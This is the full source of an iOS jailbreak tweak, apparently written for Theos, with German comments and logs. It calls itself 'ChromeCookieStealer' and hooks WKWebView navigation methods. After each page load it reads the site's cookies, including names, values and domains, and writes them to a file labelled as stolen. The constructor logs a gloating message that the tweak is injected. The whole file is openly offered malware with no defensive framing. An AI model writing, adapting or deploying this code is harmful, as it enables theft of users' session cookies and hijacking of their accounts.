#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>

static NSString * const kSavePath = @"/var/mobile/Documents/stolen_chrome_cookies.txt";

static void StealAndSaveCookies(NSURL *url) {
    if (!url) return;

    NSArray<NSHTTPCookie *> *cookies = [[NSHTTPCookieStorage sharedHTTPCookieStorage] cookiesForURL:url];
    if (cookies.count == 0) return;

    NSMutableString *data = [NSMutableString string];
    [data appendFormat:@"=== COOKIES GESTOHLEN ===\nURL: %@\nZeit: %@\nAnzahl: %lu\n\n", url.absoluteString, [NSDate date], (unsigned long)cookies.count];

    for (NSHTTPCookie *cookie in cookies) {
        [data appendFormat:@"Name: %@\nValue: %@\nDomain: %@\nPath: %@\nExpires: %@\nSecure: %d\nHTTPOnly: %d\n\n",
            cookie.name, cookie.value, cookie.domain, cookie.path, cookie.expiresDate ?: @"Session", cookie.isSecure, cookie.isHTTPOnly];
    }

    NSError *error = nil;
    [data writeToFile:kSavePath atomically:YES encoding:NSUTF8StringEncoding error:&error];
    if (error) {
        NSLog(@"[ChromeCookieStealer] Fehler beim Speichern: %@", error);
    } else {
        NSLog(@"[ChromeCookieStealer] %lu Cookies von %@ geklaut → %@", (unsigned long)cookies.count, url.absoluteString, kSavePath);
    }
}

%hook WKWebView

- (void)loadRequest:(NSURLRequest *)request {
    %orig;

    // Nach 3 Sekunden klauen + reload
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        if (self.URL) {
            StealAndSaveCookies(self.URL);
            [self reload];
        }
    });
}

// Fallback: Bei jeder Navigation nochmal checken
- (void)goForward {
    %orig;
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        if (self.URL) StealAndSaveCookies(self.URL);
    });
}

- (void)goBack {
    %orig;
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        if (self.URL) StealAndSaveCookies(self.URL);
    });
}

%end

%ctor {
    NSLog(@"[ChromeCookieStealer] Injected – wir sind drin, Boss! Cookies gehören jetzt uns 😈");
}
